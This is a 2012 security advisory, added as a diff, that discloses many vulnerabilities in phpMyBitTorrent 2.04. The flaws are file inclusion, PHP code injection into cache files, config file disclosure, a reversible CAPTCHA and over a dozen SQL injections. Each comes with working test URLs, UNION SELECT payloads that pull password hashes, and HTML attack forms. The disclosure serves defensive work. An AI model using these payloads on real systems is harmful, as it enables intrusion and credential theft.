@@ -1,0 +1,1624 @@
+[waraxe-2012-SA#091] - Multiple Vulnerabilities in phpMyBitTorrent 2.04
+===============================================================================
+
+Author: Janek Vind "waraxe"
+Date: 01. October 2012
+Location: Estonia, Tartu
+Web: http://www.waraxe.us/advisory-91.html
+
+
+Description of vulnerable target:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+phpMyBitTorrent is the brand new Open Source solution for BitTorrent
+communities! phpMyBitTorrent is all written in PHP, uses the popular MySQL
+database and support every BitTorrent protocol extension. 
+
+https://www.phpmybittorrent.com/
+
+http://sourceforge.net/projects/phpmybittorrent/
+
+
+###############################################################################
+1. Local File Inclusion in "include/config.php"
+###############################################################################
+
+Reasons: insufficient sanitization of user-supplied data
+Attack vectors:
+ 1. user-supplied cookie parameters "bttheme" and "btlanguage"
+ 2. user-supplied parameter "theme_change"
+Preconditions:
+ 1. magic_quotes_gpc=off
+ 2. PHP must be < 5.3.4 for null-byte attacks to work
+
+
+PHP script "include/config.php" line 56:
+------------------------[ source code start ]----------------------------------
+if (!isset($_COOKIE["bttheme"])) $bttheme = "";
+if (!isset($_COOKIE["btlanguage"])) $btlanguage = "";
+...
+if (isset($btlanguage) AND is_readable("language/".$btlanguage.".php")) 
+  $language = $btlanguage;
+if (isset($bttheme) AND is_readable("themes/".$bttheme."/main.php"))
+  $theme = $bttheme;
+...
+if (file_exists("./language/".$language.".php"))
+        require_once("./language/".$language.".php");
+...
+if (file_exists("./themes/".$theme."/main.php")) {
+        require_once("./themes/".$theme."/main.php");
+------------------------[ source code end ]------------------------------------
+
+Test cookies:
+
+bttheme=../avatars/user/waraxe.jpg%00z;
+btlanguage=../avatars/user/waraxe.jpg%00z;
+
+
+PHP script "include/config.php" line 199:
+------------------------[ source code start ]----------------------------------
+if (isset($theme_change)){
+  $bttheme = $theme_change;
+...
+if (isset($bttheme) AND is_readable("themes/".$bttheme."/main.php")) $theme =
+   $bttheme;
+...
+if (file_exists("./themes/".$theme."/main.php")) {
+        require_once("./themes/".$theme."/main.php");
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt//?theme_change=../avatars/user/waraxe.jpg%00z
+
+
+###############################################################################
+2. Insecure cache file handling in "blocks/newestmember_block.php"
+###############################################################################
+
+Reasons:
+ 1. unrestricted direct access to the cache file
+ 2. uninitialized variable "$newestmemberrecords"
+Attack vector: user-supplied parameter "newestmemberrecords"
+Preconditions: none
+Result:
+ 1. last 5 registered users credentials leakage
+ 2. attacker is able to inject php code to the cache file
+
+ 
+PHP script "blocks/newestmember_block.php" line 35:
+------------------------[ source code start ]----------------------------------
+$file = "cache/cache_newestmemberblock.txt";
+$expire = 60; // time in seconds
+if (file_exists($file) &&
+    filemtime($file) > (time() - $expire)) {
+    $newestmemberrecords = unserialize(file_get_contents($file));
+}else{ 
+    $newestmemberquery = $db->sql_query("SELECT * FROM ".$db_prefix."_users 
+       WHERE active = 1 AND ban ='0' ORDER BY id DESC LIMIT 5");
+    
+    while ($newestmemberrecord = $db->sql_fetchrow($newestmemberquery) ) {
+        $newestmemberrecords[] = $newestmemberrecord;
+    }
+    $OUTPUT = serialize($newestmemberrecords);
+    $fp = fopen($file,"w");
+    fputs($fp, $OUTPUT);
+    fclose($fp);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/cache/cache_newestmemberblock.txt
+
+Result:
+-------------------------[ result start ]--------------------------------------
+a:1:{i:0;a:116:{i:0;s:1:"1";s:2:"id";s:1:"1";i:1;s:6:"waraxe";
+...
+s:8:"password";s:32:"123456789123456789123456789abcde";
+-------------------------[ result end ]----------------------------------------
+
+As result, anyone can obtain usernames and hashed passwords of last 5 registered
+users and then try to crack md5 hashes or forge session cookies, resulting in
+account overtaking. Additionally it is possible to inject arbitrary data to the
+cache file, including php code:
+
+http://pmbt/?newestmemberrecords[][username]=war<?php+phpinfo();?>axe
+
+After that let's look at cache file:
+
+http://pmbt/cache/cache_newestmemberblock.txt
+
+Result:
+-------------------------[ result start ]--------------------------------------
+a:2:{i:0;a:1:{s:8:"username";s:24:"war<?php phpinfo();?>axe";}
+-------------------------[ result end ]----------------------------------------
+
+Attacker can combine php code injection to cache file with Local File Inclusion
+vulnerabilities and obtain PHP-level access to remote system.
+
+
+###############################################################################
+3. Insecure cache file handling in "staff.php"
+###############################################################################
+
+Reason: uninitialized variable "$staff_table"
+Attack vector: user-supplied parameter "staff_table"
+Preconditions: none
+Result: attacker is able to inject php code to the cache file
+
+ 
+PHP script "staff.php" line 38:
+------------------------[ source code start ]----------------------------------
+$cache_file = "cache/staff.txt";
+...
+$staff_table[ $arr['level'] ] = $staff_table[ $arr['level'] ]
+...
+$fp = fopen($cache_file, 'w');
+fwrite($fp, serialize($staff_table));
+fclose($fp);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/staff.php?staff_table[]=<?php+phpinfo();?>
+
+Result:
+
+http://pmbt/cache/staff.txt
+
+-------------------------[ result start ]--------------------------------------
+a:2:{i:0;s:18:"<?php phpinfo();?>";s:5:"admin";s:325:"
+-------------------------[ result end ]----------------------------------------
+
+
+###############################################################################
+4. Remote File Disclosure in "ajax.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "torrent"
+Preconditions:
+ 1. magic_quotes_gpc=off
+ 2. PHP must be < 5.3.4 for null-byte attacks to work
+Result: attacker can disclose the contents of arbitrary files
+
+ 
+PHP script "ajax.php" line 1770:
+------------------------[ source code start ]----------------------------------
+case 'view_nfo_page':{
+  $nfo = "";
+  $nf = fopen("torrent/".$_GET['torrent'].".nfo","rb");
+  while (!feof($nf)) $nfo .= fread($nf,100);
+  fclose($nf);
+  OpenTable("NFO");
+  echo "<p class=\"nfo\">".nl2br(str_replace(" ","&nbsp;",htmlentities($nfo)))
+    ."</p>";
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=view_nfo_page&torrent=../include/configdata.php%00z
+
+As result we can see various sensitive configuration data, including plaintext
+database credentials.
+
+
+###############################################################################
+5. Insecure CAPTCHA implementation in "gfxgen.php"
+###############################################################################
+
+Reason: weak cryptography
+Result: automated tools can bypass CAPTCHA restrictions
+
+PHP script "gfxgen.php" line 34:
+------------------------[ source code start ]----------------------------------
+$code = base64_decode($_GET["code"]);
+$image = ImageCreateFromJPEG("include/code_bg.jpg");
+$text_color = ImageColorAllocate($image, 80, 80, 80);
+Header("Content-type: image/jpeg");
+ImageString ($image, 5, 12, 2, $code, $text_color);
+ImageJPEG($image, '', 75);
+ImageDestroy($image);
+------------------------[ source code end ]------------------------------------
+
+As we can see, reversible base64 encoding algorithm is used in default CAPTCHA
+implementation. Let's look at login page with enabled CAPTCHA:
+
+------------------------[ source code start ]----------------------------------
+<p align="center">Security Code<br>
+<img src="gfxgen.php?code=Q0k2RE8=" alt="Security Code">
+------------------------[ source code end ]------------------------------------
+
+Parameter "code" has value "Q0k2RE8=" and after base64 decoding we have "CI6DO"
+, so it's obvious, that current CAPTCHA impementation in phpMyBitTorrent is
+completely useless.
+
+
+###############################################################################
+6. Multiple SQL Injections in "ajax.php"
+###############################################################################
+
+--># Case 1 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "username"
+Preconditions:
+ 1. magic_quotes_gpc=off
+ 2. logged in as user
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 165:
+------------------------[ source code start ]----------------------------------
+case "check_username": {
+ if (!$user->user) loginrequired("user",true);
+...
+ // check for that username
+ $sql = "SELECT COUNT(`id`) FROM `".$db_prefix."_users` WHERE `username`
+  = '".$_GET['username']."'";
+ $res = $db->sql_query($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=check_username&username=war'axe
+
+
+--># Case 2 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameter "to"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 192:
+------------------------[ source code start ]----------------------------------
+case 'private__chat':{
+...
+$sql = "SELECT S.*, U.id as uid, U.can_do as can_do, U.donator AS donator, 
+ U.warned as warned, U.level as level, IF(U.name IS NULL, U.username, U.name)
+ as user_name FROM ".$db_prefix."_shouts S LEFT JOIN ".$db_prefix."_users U ON
+ S.user = U.id WHERE S.id_to ='".$to."' AND S.user = '".$user->id."' OR 
+ S.user='".$to."' AND S.id_to ='".$user->id."' ORDER BY posted DESC LIMIT
+ ".$shout_config['shouts_to_show'].";";
+                $shoutres = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=private__chat&to=-1'UNION+SELECT+1,2,@@version,4,5,6,7,8,9,10,11%23    
+
+
+--># Case 3 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameter "shotuser"
+Preconditions:
+ 1. magic_quotes_gpc=off
+ 2. logged in as user with shout privileges
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 368:
+------------------------[ source code start ]----------------------------------
+case 'view_shout':{
+...
+if(isset($shotuser)){
+ $privateonly = "WHERE S.id_to ='".$shotuser."' AND S.user =
+ '".$user->id."' OR  S.id_to ='".$user->id."' AND S.user = '".$shotuser."'";
+...
+$sql = "SELECT S.*, U.id as uid, U.can_do as can_do, U.donator AS donator, 
+U.warned as warned, U.level as level, IF(U.name IS NULL, U.username, U.name)
+ as user_name FROM ".$db_prefix."_shouts S LEFT JOIN ".$db_prefix."_users U ON
+ S.user = U.id ".$privateonly." ORDER BY posted DESC LIMIT 
+ ".$shout_config['shouts_to_show'].";";
+$shoutres = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=view_shout&shotuser='UNION+SELECT+1,2,@@version,4,0,6,7,8,9,10,11%23
+
+
+--># Case 4 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "shout"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 513:
+------------------------[ source code start ]----------------------------------
+case 'take_delete_shout':{
+  $sql = "SELECT `text`, `user` FROM `".$db_prefix."_shouts` WHERE
+  `id` = '".$_GET['shout']."'";
+  $res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=take_delete_shout&shout=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe'' at line 1
+
+
+--># Case 5 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "shout"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 528:
+------------------------[ source code start ]----------------------------------
+case 'take_delete_archive_shout':{
+  $sql = "SELECT `text`, `user` FROM `".$db_prefix."_shouts` WHERE 
+  `id` = '".$_GET['shout']."'";
+  $res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=take_delete_archive_shout&shout=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe'' at line 1
+
+
+--># Case 6 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "shout"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 550:
+------------------------[ source code start ]----------------------------------
+case 'take_edit_shout':{
+...
+  $sql = "SELECT `text`, `user` FROM `".$db_prefix."_shouts` WHERE 
+  `id` = '".$_GET['shout']."'";
+  $res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=take_edit_shout&shout=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe'' at line 1
+
+
+--># Case 7 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "shout"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 572:
+------------------------[ source code start ]----------------------------------
+case 'take_edit_archive_shout':{
+...
+ $sql = "SELECT `text`, `user` FROM `".$db_prefix."_shouts` WHERE 
+ `id` = '".$_GET['shout']."'";
+ $res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=take_edit_archive_shout&shout=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe'' at line 1
+
+
+--># Case 8 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "pass"
+Preconditions:
+ 1. magic_quotes_gpc=off
+ 2. logged in as user
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 1116:
+------------------------[ source code start ]----------------------------------
+case 'view_peers_page':{
+...
+ $sql = "SELECT password FROM ".$db_prefix."_torrents WHERE id =
+  '".$_GET['torrent']."' AND (password IS NULL OR password =
+  '".$_GET["pass"]."') LIMIT 1;";
+ $res = $db->sql_query($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=view_peers_page&torrent=1&pass=war'axe
+
+
+--># Case 9 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "pass"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+
+PHP script "ajax.php" line 1286:
+------------------------[ source code start ]----------------------------------
+case 'view_files_page':{
+...
+ $password= (isset($_GET["pass"]))? $_GET["pass"] : '';
+...
+ $password = urldecode($password);
+ $sql = "SELECT password FROM ".$db_prefix."_torrents WHERE id = '".$id."' AND
+ (password IS NULL OR password = '".$password."') LIMIT 1;";
+ $res = $db->sql_query($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=view_files_page&torrent=1&pass=war%2527axe
+
+
+--># Case 10 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "torrent"
+Preconditions:
+ 1. magic_quotes_gpc=off
+ 2. logged in as user
+Result: attacker can manipulate database queries
+
+
+PHP script "ajax.php" line 1340:
+------------------------[ source code start ]----------------------------------
+case 'view_rate_page':{
+...
+if ($_GET["owner"] != $user->id AND ($user->user)) {
+ $xres = $db->sql_query("SELECT rating, added FROM ".$db_prefix."_ratings WHERE
+ torrent = '".$_GET['torrent']."' AND user = '" . $user->id."'") or btsqlerror
+...
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=view_rate_page&torrent=war'axe
+
+
+--># Case 11 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "torrent"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 1476:
+------------------------[ source code start ]----------------------------------
+case 'view_details_page':{
+...
+ $sql = "SELECT A.id as id, A.exeem, A.seeders, A.leechers, A.tot_peer, A.speed
+...
+ WHERE A.id = '".$_GET['torrent']."' GROUP BY A.id LIMIT 1;";
+ $res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=view_details_page&torrent=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe' GROUP BY A.id
+LIMIT 1' at line 1
+
+
+--># Case 12 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "torrent"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 1783:
+------------------------[ source code start ]----------------------------------
+case 'view_details':{
+...
+ $sql = "SELECT A.id as id, A.exeem, A.seeders, A.leechers, A.tot_peer, A.speed
+...
+ WHERE A.id = '".$_GET['torrent']."' GROUP BY A.id LIMIT 1;";
+ $res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=view_details&torrent=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe' GROUP BY A.id
+LIMIT 1' at line 1
+
+
+--># Case 13 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "shout"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 2067:
+------------------------[ source code start ]----------------------------------
+case 'archivedeleteshout':{
+$sql = "SELECT `text`, `user` FROM `".$db_prefix."_shouts` WHERE 
+ `id` = '".$_GET['shout']."'";
+$res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=archivedeleteshout&shout=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe'' at line 1
+
+
+--># Case 14 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "torrent"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 2083:
+------------------------[ source code start ]----------------------------------
+case 'get_imdb':{
+require ("imdb/imdb.class.php");
+$sql = "SELECT A.id as id, A.exeem, A.seeders, A.leechers, A.tot_peer, A.speed
+...
+WHERE A.id = '".$_GET['torrent']."' GROUP BY A.id LIMIT 1;";
+$res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=get_imdb&torrent=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe' GROUP BY A.id
+LIMIT 1' at line 1
+
+
+--># Case 15 #<--
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "search"
+Preconditions:
+ 1. magic_quotes_gpc=off
+ 2. logged in as user
+Result: attacker can manipulate database queries
+
+ 
+PHP script "ajax.php" line 2207:
+------------------------[ source code start ]----------------------------------
+case 'member_search':{
+...
+if ( isset( $_GET['search'] ) && !empty( $_GET['search'] ) ){
+ $query = "username LIKE ('%$search%') AND active='1'";
+...
+$res = mysql_query("SELECT COUNT(*) FROM ".$db_prefix."_users WHERE $query")
+ or sqlerr();
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/ajax.php?op=member_search&search=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe%') AND active='1'
+
+
+###############################################################################
+7. SQL Injection in "backend.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameter "cat"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "backend.php" line 176:
+------------------------[ source code start ]----------------------------------
+case "category": {
+...
+  $sql_cat = "SELECT name FROM ".$db_prefix."_categories 
+  WHERE id = ".$cat."";
+  $res = $db->sql_query($sql_cat);
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://pmbt/backend.php?op=category&cat=0+UNION+SELECT+@@version%23
+
+http://pmbt/backend.php?op=category&cat=0+UNION+SELECT+password+FROM+
+torrent_users+WHERE+id=1%23
+
+
+###############################################################################
+8. SQL Injection in "casino_player_edit.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameter "player"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "casino_player_edit.php" line 36:
+------------------------[ source code start ]----------------------------------
+$result = $db->sql_query("select * from ".$db_prefix."_casino where userid =
+ '".$player."'") or die(mysql_error());
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/casino_player_edit.php?player=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe'' at line 1
+
+
+###############################################################################
+9. SQL Injection in "deloffer.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameter "offerid"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "deloffer.php" line 34:
+------------------------[ source code start ]----------------------------------
+$id = $_POST["offerid"];
+$res = $db->sql_query("SELECT userid, name from ".$db_prefix."_offers where
+ id=$id");
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/deloffer.php" method="post">
+<input type="hidden" name="offerid" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+10. SQL Injection in "edit.php"
+###############################################################################
+
+Reason:
+ 1. insufficient sanitization of user-supplied data
+ 2. uninitialized variable "$id"
+Attack vector: user-supplied parameters "torrent_id" and "id"
+Preconditions:
+ 1. magic_quotes_gpc=off
+ 2. logged in as user
+Result: attacker can manipulate database queries
+
+ 
+PHP script "edit.php" line 37:
+------------------------[ source code start ]----------------------------------
+if (isset($torrent_id)) $id = $torrent_id;
+...
+if (is_array($id))
+{
+foreach($id as $item)
+{
+$sql = "SELECT owner,name FROM ".$db_prefix."_torrents WHERE id = '".$item."';";
+$res = $db->sql_query($sql) or btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/edit.php?id[]=war'axe
+http://pmbt/edit.php?torrent_id[]=war'axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe'' at line 1
+
+
+###############################################################################
+11. SQL Injection in "frame.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameter "password"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+
+PHP script "frame.php" line 80:
+------------------------[ source code start ]----------------------------------
+case "filelist": {
+ if (!isset($id) OR !is_numeric($id) OR $id < 1) error(_bterridnotset);
+ $password = urldecode($password);
+ $sql = "SELECT password FROM ".$db_prefix."_torrents WHERE id = '".$id."' AND
+  (password IS NULL OR password = '".$password."') LIMIT 1;";
+ $res = $db->sql_query($sql);
+------------------------[ source code end ]------------------------------------
+
+Tests:
+
+http://pmbt/frame.php?op=filelist&id=1&password=war%2527axe
+http://pmbt/frame.php?op=commentlist&id=1&password=war%2527axe
+http://pmbt/frame.php?op=peerlist&id=1&password=war%2527axe
+
+Result:
+
+You have an error in your SQL syntax; check the manual that corresponds to your
+MySQL server version for the right syntax to use near 'axe') LIMIT 1' at line 1
+
+
+###############################################################################
+12. SQL Injection in "helpdesk.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameters "title", "problem", "category" and
+"priority"
+Preconditions:
+ 1. magic_quotes_gpc=off (for parameters "title", "problem" and "priority")
+Result: attacker can manipulate database queries
+
+
+PHP script "helpdesk.php" line 120:
+------------------------[ source code start ]----------------------------------
+$problem = (isset($_POST["problem"])) ? trim($_POST["problem"]) : false;
+if ($op == "ticket" ){
+...
+$upd_sql = "INSERT INTO ".$db_prefix."_helpdesk (`uid`, `title`, `problem`, 
+ `category`, `priority`, `open_date`) VALUES  ('".$user->id."', '".$title."', 
+  '".$problem."', ".$category.", '".$priority."', NOW())";
+$db->sql_query($upd_sql) or btsqlerror($upd_sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/helpdesk.php?op=ticket" method="post">
+<input type="hidden" name="problem" value="1">
+<input type="hidden" name="title" value="2">
+<input type="hidden" name="category" value="waraxe">
+<input type="hidden" name="priority" value="3">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result:
+
+Unknown column 'waraxe' in 'field list'
+
+
+###############################################################################
+13. SQL Injection in "hitruns.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameters "reset" and "warn"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "hitruns.php" line 94:
+------------------------[ source code start ]----------------------------------
+if (isset($_POST["reset"])) {
+mysql_query("UPDATE ".$db_prefix."_snatched SET 
+hitrun = '0000-00-00 00:00:00', hitrunwarn = 'no' WHERE id 
+IN (".implode(", ", $_POST["reset"]).")") or sqlerr();
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/hitruns.php" method="post">
+<input type="hidden" name="reset[]" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result:
+
+Unknown column 'waraxe' in 'field list'
+
+PHP script "hitruns.php" line 101:
+------------------------[ source code start ]----------------------------------
+} elseif (isset($_POST["warn"])) {
+$userids = $warnids = array();
+$res = mysql_query("SELECT userid FROM ".$db_prefix."_snatched
+WHERE id IN (".implode(", ", $_POST["warn"]).")") or sqlerr();
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/hitruns.php" method="post">
+<input type="hidden" name="warn[]" value="waraxe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result:
+
+Unknown column 'waraxe' in 'where clause'
+
+
+###############################################################################
+14. SQL Injection in "makepoll.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameters "pollid", "question", "option0",
+ "option1","option2","option3","option4","option5","option6","option7",
+ "option8","option9", "sort"
+Preconditions:
+ 1. magic_quotes_gpc=off (for parameters "question", "option0", "option1",
+  "option2","option3","option4","option5","option6","option7", "option8",
+  "option9", "sort")
+Result: attacker can manipulate database queries
+
+ 
+PHP script "makepoll.php" line 54:
+------------------------[ source code start ]----------------------------------
+$pollid = $_POST["pollid"];
+$question = $_POST["question"];
+$option0 = $_POST["option0"];
+$option1 = $_POST["option1"];
+$option2 = $_POST["option2"];
+$option3 = $_POST["option3"];
+$option4 = $_POST["option4"];
+$option5 = $_POST["option5"];
+$option6 = $_POST["option6"];
+$option7 = $_POST["option7"];
+$option8 = $_POST["option8"];
+$option9 = $_POST["option9"];
+$sort = $_POST["sort"];
+$returnto = $_POST["returnto"];
+
+if (!$question || !$option0 || !$option1)
+  bterror(_btpolls_missing,_bterror);
+
+if ($pollid)
+  
+        $db->sql_query("UPDATE ".$db_prefix."_polls SET " .
+        "question = '" . $question . "', " .
+        "option0 = '" . $option0 . "', " .
+        "option1 = '" . $option1 . "', " .
+        "option2 = '" . $option2 . "', " .
+        "option3 = '" . $option3 . "', " .
+        "option4 = '" . $option4 . "', " .
+        "option5 = '" . $option5 . "', " .
+        "option6 = '" . $option6 . "', " .
+        "option7 = '" . $option7 . "', " .
+        "option8 = '" . $option8 . "', " .
+        "option9 = '" . $option9 . "', " .
+        "sort = '" . $sort . "' " .
+    "WHERE id = $pollid") or die(mysql_error(__FILE__, __LINE__));
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/makepoll.php" method="post">
+<input type="hidden" name="pollid" value="waraxe">
+<input type="hidden" name="question" value="1">
+<input type="hidden" name="option0" value="2">
+<input type="hidden" name="option1" value="3">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+Result:
+
+Unknown column 'waraxe' in 'where clause'
+
+
+###############################################################################
+15. SQL Injection in "modrules.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied GET parameter "id"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
+PHP script "modrules.php" line 40:
+------------------------[ source code start ]----------------------------------
+$id = (isset($_GET["id"]))? $_GET["id"] : '';
+...
+$sql = "DELETE FROM ".$db_prefix."_rules WHERE id = $id ";
+if (!$db->sql_query($sql)) btsqlerror($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+
+http://pmbt/modrules.php?act=delete&id=waraxe
+
+Result:
+
+Unknown column 'waraxe' in 'where clause'
+
+
+###############################################################################
+16. SQL Injection in "mybonus.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied POST parameter "option"
+Preconditions:
+ 1. magic_quotes_gpc=off
+Result: attacker can manipulate database queries
+
+ 
+PHP script "mybonus.php" line 91:
+------------------------[ source code start ]----------------------------------
+if ($action == "exchange") {
+...
+$option = $_POST["option"];
+...
+$sql = ("SELECT * FROM ".$db_prefix."_bonus WHERE id='$option'");
+$res = $db->sql_query($sql);
+------------------------[ source code end ]------------------------------------
+
+Test:
+-------------------------[ test code start ]-----------------------------------
+<html><body><center>
+<form action="http://pmbt/mybonus.php" method="post">
+<input type="hidden" name="action" value="exchange">
+<input type="hidden" name="option" value="war'axe">
+<input type="submit" value="Test">
+</form>
+</center></body></html>
+--------------------------[ test code end ]------------------------------------
+
+
+###############################################################################
+17. SQL Injection in "problems.php"
+###############################################################################
+
+Reason: insufficient sanitization of user-supplied data
+Attack vector: user-supplied parameter "t"
+Preconditions: none
+Result: attacker can manipulate database queries
+
+ 
